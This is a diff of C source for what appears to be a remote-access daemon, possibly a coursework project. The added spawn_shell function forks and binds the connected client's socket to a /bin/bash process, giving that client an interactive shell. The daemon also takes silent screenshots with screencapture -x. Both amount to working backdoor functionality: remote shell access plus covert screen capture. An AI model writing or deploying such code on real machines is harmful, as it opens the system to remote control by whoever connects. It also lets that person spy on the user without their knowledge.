@@ -88,12 +88,37 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 	return (true);
 }
 
+void	spawn_shell(t_users *users, char **envp)
+{
+	pid_t	pid = 0;
+	char	*shell[] = {"/bin/bash", NULL};
+	int		status;
+
+	pid = fork();
+	if (pid == -1)
+	{
+		perror("fork failed");
+	}
+	else if (pid == 0)
+	{
+		for(int i=0; i<3; i++)
+			dup2(users->sd, i);
+		send(users->sd, "Spawning shell on port 4242\n> ", 30, 0);
+		if (execve(shell[0], shell, envp) == -1)
+			printf("error\n");
+	}
+	else
+	{
+		waitpid(pid, &status, 0);
+		kill(pid, SIGTERM);
+	}
+}
+
 bool	run_daemon(t_connexion *connexion, char **envp)
 {
 	char		buffer[BUFFSIZE + 1];
 	ssize_t		valrecv = 0;
-	char	*shell[] = {"/bin/bash", NULL};
-	char	*screen[] = {"screencapture", "-x", "test1.png", NULL};
+	char	*screen[] = {"/usr/sbin/screencapture", "-x", "test1.png", NULL};
 	t_users		users;
 
 	memset(&users, 0, sizeof(users));
@@ -174,11 +199,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						}
 						if (!strcmp(buffer, "shell"))
 						{
-							for(int i=0; i<3; i++)
-								dup2(users.sd, i);
-							send(users.sd, "Spawning shell on port 4242\n> ", 30, 0);
-							if (execve(shell[0], shell, envp) == -1)
-								printf("error\n");
+							spawn_shell(&users, envp);
 						}
 					}
 					memset(&buffer, 0, BUFFSIZE);
